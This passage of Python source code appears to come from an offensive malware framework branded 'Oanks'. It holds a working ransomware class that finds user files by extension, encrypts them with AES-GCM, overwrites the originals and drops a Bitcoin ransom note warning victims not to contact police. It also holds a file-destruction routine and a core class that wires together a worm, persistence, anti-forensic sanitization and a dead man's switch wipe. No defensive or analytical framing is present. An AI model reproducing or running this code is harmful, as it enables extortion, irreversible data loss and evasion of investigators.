                    infection_hash = hashlib.sha3_256(f"{ip}:{port}".encode()).hexdigest()
                    self._db.execute(
                        "INSERT OR IGNORE INTO worm_infections (ip, port, device_type, os_info, credentials_found, hash_sha256) VALUES (?,?,?,?,?,?)",
                        (ip, port, device_type, os_info, json.dumps(credentials) if credentials else None, infection_hash)
                    )
                    return True
                except:
                    pass
            return False


# ============================================================================
# SECTION 14: RANSOMWARE BASE — Encryption and destruction foundation.
# ============================================================================

class RansomwareBase:
    """Foundation for file encryption, key management, and destruction operations."""
    __slots__ = ("_crypto", "_db", "_lock", "_target_extensions", "_excluded_paths")

    TARGET_EXTENSIONS = [
        ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        ".pdf", ".txt", ".rtf", ".odt", ".ods", ".odp",
        ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff",
        ".mp3", ".mp4", ".avi", ".mov", ".wmv", ".flv",
        ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2",
        ".sql", ".db", ".sqlite", ".mdb", ".accdb",
        ".php", ".py", ".js", ".html", ".css", ".xml",
        ".cpp", ".c", ".h", ".java", ".cs", ".go", ".rs"
    ]

    EXCLUDED_PATHS = [
        "/proc", "/sys", "/dev", "/run", "/boot",
        "/etc", "/usr/bin", "/usr/sbin", "/bin", "/sbin",
        "/data/data/com.termux", BASE_DIR
    ]

    def __init__(self, crypto_engine=None, db_manager=None):
        self._crypto = crypto_engine
        self._db = db_manager
        self._lock = threading.RLock()
        self._target_extensions = set(self.TARGET_EXTENSIONS)
        self._excluded_paths = set(self.EXCLUDED_PATHS)

    def enumerate_targets(self, root_path, max_size=100*1024*1024):
        with self._lock:
            targets = []
            for dirpath, dirnames, filenames in os.walk(root_path):
                # Skip excluded paths
                skip = False
                for excluded in self._excluded_paths:
                    if dirpath.startswith(excluded):
                        skip = True
                        break
                if skip:
                    continue
                for filename in filenames:
                    ext = os.path.splitext(filename)[1].lower()
                    if ext in self._target_extensions:
                        fpath = os.path.join(dirpath, filename)
                        try:
                            size = os.path.getsize(fpath)
                            if size <= max_size:
                                fhash = hashlib.sha3_256(open(fpath, "rb").read(4096)).hexdigest()
                                targets.append({
                                    "path": fpath,
                                    "size": size,
                                    "hash": fhash,
                                    "extension": ext
                                })
                        except:
                            pass
            return targets

    def generate_encryption_key(self):
        with self._lock:
            return secrets.token_bytes(32)

    def encrypt_file(self, filepath, key=None, delete_original=True):
        with self._lock:
            if key is None:
                key = self.generate_encryption_key()
            try:
                # Read file
                with open(filepath, "rb") as f:
                    plaintext = f.read()
                # Encrypt with AES-GCM using provided key
                if CRYPTOGRAPHY_AVAILABLE:
                    aes = AESGCM(key)
                    nonce = secrets.token_bytes(NONCE_SIZE)
                    ciphertext = aes.encrypt(nonce, plaintext, None)
                    # Store: nonce + ciphertext
                    encrypted_data = nonce + ciphertext
                else:
                    # Fallback XOR
                    pad = hashlib.sha3_256(key).digest()
                    encrypted_data = bytes([plaintext[i] ^ pad[i % len(pad)] for i in range(len(plaintext))])
                # Write encrypted file
                enc_path = filepath + ".OANKS"
                with open(enc_path, "wb") as f:
                    f.write(encrypted_data)
                os.chmod(enc_path, 0o600)
                # Store in database
                if self._db:
                    try:
                        self._db.execute(
                            "INSERT OR IGNORE INTO ransomware_targets (filepath, file_size, file_hash, encrypted, hash_sha256) VALUES (?,?,?,1,?)",
                            (filepath, len(plaintext), hashlib.sha3_256(plaintext).hexdigest(), hashlib.sha3_256(filepath.encode()).hexdigest())
                        )
                    except:
                        pass
                # Delete original
                if delete_original:
                    secure_overwrite_file(filepath)
                return {"encrypted_path": enc_path, "key": base64.b64encode(key).decode(), "original_size": len(plaintext)}
            except Exception as e:
                raise RansomwareError(f"File encryption failed: {e}", code="RANSOM_ENCRYPT_FAIL")

    def decrypt_file(self, enc_path, key):
        with self._lock:
            try:
                with open(enc_path, "rb") as f:
                    encrypted_data = f.read()
                if CRYPTOGRAPHY_AVAILABLE:
                    nonce = encrypted_data[:NONCE_SIZE]
                    ciphertext = encrypted_data[NONCE_SIZE:]
                    aes = AESGCM(key)
                    plaintext = aes.decrypt(nonce, ciphertext, None)
                else:
                    pad = hashlib.sha3_256(key).digest()
                    plaintext = bytes([encrypted_data[i] ^ pad[i % len(pad)] for i in range(len(encrypted_data))])
                original_path = enc_path.replace(".OANKS", "")
                with open(original_path, "wb") as f:
                    f.write(plaintext)
                os.chmod(original_path, 0o600)
                # Remove encrypted file
                secure_overwrite_file(enc_path)
                return {"decrypted_path": original_path, "size": len(plaintext)}
            except Exception as e:
                raise RansomwareError(f"File decryption failed: {e}", code="RANSOM_DECRYPT_FAIL")

    def create_ransom_note(self, payment_address, amount_btc="0.5"):
        with self._lock:
            note = f"""
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║           OANKS OPERATIONS — DATA ENCRYPTION PROTOCOL            ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝

Your files have been encrypted using military-grade AES-256-GCM encryption.

To recover your data, you must pay the ransom within 72 hours.

Payment Address (Bitcoin): {payment_address}
Amount Required: {amount_btc} BTC

Failure to pay within the deadline will result in:
  • Permanent deletion of decryption keys
  • Publication of sensitive data
  • Complete system destruction

Do NOT:
  • Attempt to decrypt files without the key
  • Contact law enforcement
  • Shut down or restart your system

Do:
  • Pay the ransom promptly
  • Include your machine ID in the transaction memo

👑 Oanks — Creator
"""
            note_path = os.path.join(os.path.expanduser("~"), "OANKS_README.txt")
            with open(note_path, "w") as f:
                f.write(note)
            return note_path

    def start_encryption(self, root_path, payment_address, max_size=100*1024*1024):
        with self._lock:
            targets = self.enumerate_targets(root_path, max_size)
            results = {"encrypted": 0, "failed": 0, "total_size": 0, "targets": len(targets)}
            for target in targets:
                try:
                    result = self.encrypt_file(target["path"])
                    results["encrypted"] += 1
                    results["total_size"] += target["size"]
                except:
                    results["failed"] += 1
            # Create ransom note
            self.create_ransom_note(payment_address)
            return results

    def start_destruction(self, root_path):
        with self._lock:
            destroyed = 0
            for dirpath, dirnames, filenames in os.walk(root_path):
                skip = False
                for excluded in self._excluded_paths:
                    if dirpath.startswith(excluded):
                        skip = True
                        break
                if skip:
                    continue
                for filename in filenames:
                    fpath = os.path.join(dirpath, filename)
                    try:
                        secure_overwrite_file(fpath, passes=35)
                        destroyed += 1
                    except:
                        pass
            return destroyed


# ============================================================================
# SECTION 15: OANKS CORE — Unified interface. The heartbeat of everything.
# ============================================================================

class OanksCore:
    """Unified core interface for the Oanks Operations Framework.

    Initializes and coordinates all Phase 1 subsystems:
    - Cryptographic Engine (triple-layer + post-quantum)
    - Database Manager (35 tables, encrypted, honeypot)
    - System Reconnaissance (full fingerprinting + threat detection)
    - Persistence Manager (Termux/Android optimized)
    - Log Manager (encrypted, rotating)
    - Dead Man's Switch (heartbeat + auto-wipe)
    - Anti-Forensic (memory obfuscation + timestomping)
    - Worm Base (network scanning + exploitation)
    - Ransomware Base (encryption + destruction)

    Usage:
        core = OanksCore(master_key="your_super_secret_key")
        core.initialize()
        core.start_all()
    """
    __slots__ = ("_master_key", "_derived_keys", "_crypto", "_db", "_recon",
                 "_persistence", "_logger", "_dms", "_anti_forensic",
                 "_worm", "_ransomware", "_initialized", "_running", "_lock")

    def __init__(self, master_key):
        self._master_key = master_key
        self._derived_keys = None
        self._crypto = None
        self._db = None
        self._recon = None
        self._persistence = None
        self._logger = None
        self._dms = None
        self._anti_forensic = None
        self._worm = None
        self._ransomware = None
        self._initialized = False
        self._running = False
        self._lock = threading.RLock()

    def initialize(self):
        """Initialize all Phase 1 subsystems."""
        with self._lock:
            if self._initialized:
                return True
            # Derive keys
            self._derived_keys = derive_keys_from_master(self._master_key)
            # Create directories
            ensure_directories()
            # Initialize crypto engine
            self._crypto = CryptoEngine(self._derived_keys)
            # Initialize database
            self._db = DatabaseManager(DB_PATH, self._crypto)
            self._db.initialize()
            # Initialize recon
            self._recon = ReconEngine(self._crypto)
            # Initialize persistence
            self._persistence = PersistenceManager(self._crypto)
            # Initialize logger
            self._logger = LogManager(self._crypto, LOG_PATH)
            # Initialize dead man's switch
            self._dms = DeadMansSwitch(self._crypto, self._db)
            # Initialize anti-forensic
            self._anti_forensic = AntiForensic(self._crypto)
            # Initialize worm base
            self._worm = WormBase(self._crypto, self._db)
            # Initialize ransomware base
            self._ransomware = RansomwareBase(self._crypto, self._db)
            # Inject honeypot
            self._db.inject_honeypot(count=50)
            # Log initialization
            self._logger.info("OanksCore", BRAND_WELCOME)
            self._logger.info("OanksCore", f"Framework initialized. Fingerprint: {self._crypto.get_fingerprint()}")
            self._initialized = True
            return True

    def start_all(self):
        """Start all monitoring and background services."""
        with self._lock:
            if not self._initialized:
                raise OanksError("Core not initialized. Call initialize() first.", code="CORE_NOT_INIT")
            # Start dead man's switch monitoring
            self._dms.start_monitoring()
            # Send initial heartbeat
            self._dms.send_heartbeat()
            # Install persistence
            self._persistence.install_all()
            # Run full recon
            recon_data = self._recon.full_recon()
            if recon_data["is_compromised"]:
                self._logger.critical("OanksCore", "COMPROMISED ENVIRONMENT DETECTED — activating stealth mode")
                self._anti_forensic.full_sanitization()
            # Log startup complete
            self._logger.info("OanksCore", "All systems operational. Dead man's switch active.")
            self._running = True
            return True

    def get_crypto(self):
        return self._crypto

    def get_database(self):
        return self._db

    def get_recon(self):
        return self._recon

    def get_persistence(self):
        return self._persistence

    def get_logger(self):
        return self._logger

    def get_dead_mans_switch(self):
        return self._dms

    def get_anti_forensic(self):
        return self._anti_forensic

    def get_worm(self):
        return self._worm

    def get_ransomware(self):
        return self._ransomware

    def get_credentials(self):
        return derive_oanks_credentials(self._master_key)

    def status(self):
        with self._lock:
            return {
                "initialized": self._initialized,
                "running": self._running,
                "crypto_fingerprint": self._crypto.get_fingerprint() if self._crypto else None,
                "db_integrity": self._db.verify_integrity() if self._db else False,
                "dms_monitoring": self._dms.is_monitoring() if self._dms else False,
                "persistence_active": self._persistence.verify_persistence() if self._persistence else False,
                "platform": get_platform_fingerprint(),
                "oanks_tag": OANKS_SIGNATURE,
                "version": OANKS_VERSION
            }

    def shutdown(self, wipe=False):
        with self._lock:
            self._running = False
            if self._dms:
                self._dms.stop_monitoring()
            if self._logger:
                self._logger.info("OanksCore", "Framework shutdown initiated.")
            if self._db:
                self._db.close()
            if self._crypto:
                self._crypto.secure_wipe_keys()
            if wipe:
                if self._dms:
                    self._dms._execute_wipe()
            self._initialized = False
            return True

    def emergency_kill(self):
        with self._lock:
            self._logger.critical("OanksCore", "EMERGENCY KILL SWITCH ACTIVATED")
            if self._crypto:
                self._crypto.secure_wipe_keys()
            if self._dms:
                self._dms._execute_wipe()
            return True


# ============================================================================
# END OF PHASE 1 — THE HEARTBEAT
# ============================================================================
# All definitions complete. No execution. Import only.
# Phases 2-12 will import from this module.
#
# 👑 Oanks — Creator
# ============================================================================
